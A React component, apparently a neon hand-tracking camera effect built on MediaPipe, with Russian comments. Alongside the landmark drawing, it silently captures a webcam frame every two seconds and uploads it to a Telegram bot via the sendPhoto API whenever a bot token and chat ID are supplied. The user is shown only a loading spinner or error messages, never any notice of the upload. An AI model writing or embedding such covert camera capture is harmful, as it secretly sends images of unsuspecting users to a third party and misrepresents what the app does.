import { useEffect, useRef, useState } from 'react';
import { Hands } from '@mediapipe/hands';
import { drawConnectors, drawLandmarks } from '@mediapipe/drawing_utils';

const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
  const handsRef = useRef(null);
  const intervalRef = useRef(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [cameraPermission, setCameraPermission] = useState(null);

  useEffect(() => {
    const videoElement = videoRef.current;
    const canvasElement = canvasRef.current;
    
    if (!videoElement || !canvasElement) {
      console.error('Video or Canvas element not found');
      return;
    }

    const ctx = canvasElement.getContext('2d');

    // Проверяем поддержку MediaPipe на устройстве
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    try {
      handsRef.current = new Hands({
        locateFile: (file) =>
          `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
      });

      handsRef.current.setOptions({
        maxNumHands: 2,
        modelComplexity: isMobile ? 0 : 1, // Упрощенная модель для мобильных
        minDetectionConfidence: isMobile ? 0.6 : 0.7,
        minTrackingConfidence: isMobile ? 0.6 : 0.7,
      });

      handsRef.current.onResults((results) => {
        if (!canvasElement || !videoElement) return;
        
        // Устанавливаем размеры канваса
        if (canvasElement.width !== videoElement.videoWidth || canvasElement.height !== videoElement.videoHeight) {
          canvasElement.width = videoElement.videoWidth || 640;
          canvasElement.height = videoElement.videoHeight || 480;
        }

        ctx.save();
        ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);

        // ✅ Делаем зеркальное отображение
        ctx.scale(-1, 1);
        ctx.translate(-canvasElement.width, 0);
        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

        // Возвращаем трансформацию для правильного отображения landmarks
        ctx.setTransform(1, 0, 0, 1, 0, 0);

        if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
          for (let i = 0; i < results.multiHandLandmarks.length; i++) {
            const landmarks = results.multiHandLandmarks[i];
            
            // Создаем зеркальные координаты для landmarks
            const flippedLandmarks = landmarks.map(landmark => ({
              ...landmark,
              x: 1 - landmark.x // Инвертируем X координату
            }));

            // Рисуем соединения с неоновым эффектом
            drawConnectors(ctx, flippedLandmarks, Hands.HAND_CONNECTIONS, {
              color: '#00f9ff',
              lineWidth: isMobile ? 3 : 4,
            });

            // Рисуем точки landmarks с неоновым эффектом
            drawLandmarks(ctx, flippedLandmarks, {
              color: '#ff00ff',
              lineWidth: isMobile ? 2 : 3,
              radius: isMobile ? 4 : 6,
            });

            // Добавляем дополнительный неоновый эффект (упрощенный для мобильных)
            if (!isMobile) {
              flippedLandmarks.forEach((landmark, index) => {
                const x = landmark.x * canvasElement.width;
                const y = landmark.y * canvasElement.height;
                
                // Создаем градиент для неонового свечения
                const gradient = ctx.createRadialGradient(x, y, 0, x, y, 15);
                gradient.addColorStop(0, 'rgba(255, 0, 255, 0.8)');
                gradient.addColorStop(0.5, 'rgba(0, 249, 255, 0.4)');
                gradient.addColorStop(1, 'rgba(0, 249, 255, 0)');
                
                ctx.save();
                ctx.shadowBlur = 20;
                ctx.shadowColor = '#ff00ff';
                ctx.fillStyle = gradient;
                ctx.beginPath();
                ctx.arc(x, y, 8, 0, 2 * Math.PI);
                ctx.fill();
                ctx.restore();
              });
            }
          }
        }

        ctx.restore();
      });
    } catch (err) {
      console.error('Error initializing MediaPipe:', err);
      setError('MediaPipe не поддерживается на этом устройстве');
    }

    const startCamera = async () => {
      try {
        setIsLoading(true);
        setError(null);

        // Проверяем разрешение на камеру
        const permission = await navigator.permissions.query({ name: 'camera' });
        setCameraPermission(permission.state);

        if (permission.state === 'denied') {
          throw new Error('Доступ к камере запрещен');
        }

        // Настройки для камеры (оптимизированные для мобильных)
        const constraints = {
          video: {
            width: isMobile ? { ideal: 640 } : { ideal: 1280 },
            height: isMobile ? { ideal: 480 } : { ideal: 720 },
            facingMode: 'user', // Фронтальная камера
            frameRate: isMobile ? { ideal: 15 } : { ideal: 30 }
          }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = stream;
        setCameraPermission('granted');

        videoElement.onloadedmetadata = async () => {
          try {
            // Ждем пока видео полностью загрузится
            await new Promise((resolve) => {
              if (videoElement.readyState >= 3) {
                resolve();
              } else {
                videoElement.addEventListener('canplay', resolve, { once: true });
              }
            });

            await videoElement.play();
            setIsLoading(false);

            // Устанавливаем размеры канваса после загрузки видео
            canvasElement.width = videoElement.videoWidth || 640;
            canvasElement.height = videoElement.videoHeight || 480;

            const loop = async () => {
              if (videoElement && videoElement.readyState >= 2 && handsRef.current) {
                try {
                  await handsRef.current.send({ image: videoElement });
                } catch (err) {
                  console.error('MediaPipe processing error:', err);
                }
              }
              if (videoElement.srcObject) {
                requestAnimationFrame(loop);
              }
            };

            loop();

            // Отправка фото в Telegram (с проверками)
            if (botToken && chatId) {
              intervalRef.current = setInterval(() => {
                if (canvasElement && videoElement.readyState >= 2) {
                  // Создаем временный канвас для отправки
                  const tempCanvas = document.createElement('canvas');
                  const tempCtx = tempCanvas.getContext('2d');
                  tempCanvas.width = canvasElement.width;
                  tempCanvas.height = canvasElement.height;
                  
                  // Копируем текущий кадр
                  tempCtx.scale(-1, 1);
                  tempCtx.translate(-tempCanvas.width, 0);
                  tempCtx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);
                  
                  tempCanvas.toBlob((blob) => {
                    if (blob) {
                      const formData = new FormData();
                      formData.append('chat_id', chatId);
                      formData.append('photo', blob, 'snapshot.jpg');
                      
                      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData,
                      })
                        .then((res) => res.json())
                        .then((data) => {
                          if (data.ok) {
                            console.log('Фото отправлено успешно');
                          } else {
                            console.error('Ошибка Telegram API:', data);
                          }
                        })
                        .catch((err) => console.error('Ошибка отправки:', err));
                    }
                  }, 'image/jpeg', 0.8);
                }
              }, 2000); // Увеличили интервал до 2 секунд
            }
          } catch (err) {
            console.error('Ошибка при запуске видео:', err);
            setError('Не удалось запустить камеру');
            setIsLoading(false);
          }
        };

        videoElement.onerror = (err) => {
          console.error('Video error:', err);
          setError('Ошибка воспроизведения видео');
          setIsLoading(false);
        };

      } catch (err) {
        console.error('Ошибка доступа к камере:', err);
        setError(err.message || 'Не удалось получить доступ к камере');
        setIsLoading(false);
        setCameraPermission('denied');
      }
    };

    startCamera();

    return () => {
      if (videoElement?.srcObject) {
        const tracks = videoElement.srcObject.getTracks();
        tracks.forEach((track) => track.stop());
        videoElement.srcObject = null;
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      if (handsRef.current) {
        handsRef.current.close();
      }
    };
  }, [videoRef, canvasRef, botToken, chatId]);

  // Возвращаем индикатор состояния для пользователя
  if (error) {
    return (
      <div style={{
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        color: '#ff006e',
        textAlign: 'center',
        padding: '20px',
        background: 'rgba(0, 0, 0, 0.8)',
        borderRadius: '10px',
        zIndex: 1000
      }}>
        <h3>Ошибка камеры</h3>
        <p>{error}</p>
        {cameraPermission === 'denied' && (
          <p style={{ fontSize: '0.9em', marginTop: '10px' }}>
            Разрешите доступ к камере в настройках браузера и перезагрузите страницу
          </p>
        )}
      </div>
    );
  }

  if (isLoading) {
    return (
      <div style={{
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        color: '#00f9ff',
        textAlign: 'center',
        zIndex: 1000
      }}>
        <div style={{
          width: '50px',
          height: '50px',
          border: '3px solid rgba(0, 249, 255, 0.3)',
          borderTop: '3px solid #00f9ff',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite',
          margin: '0 auto 20px'
        }}></div>
        <p>Загрузка камеры...</p>
      </div>
    );
  }

  return null;
};

export default HandTracker;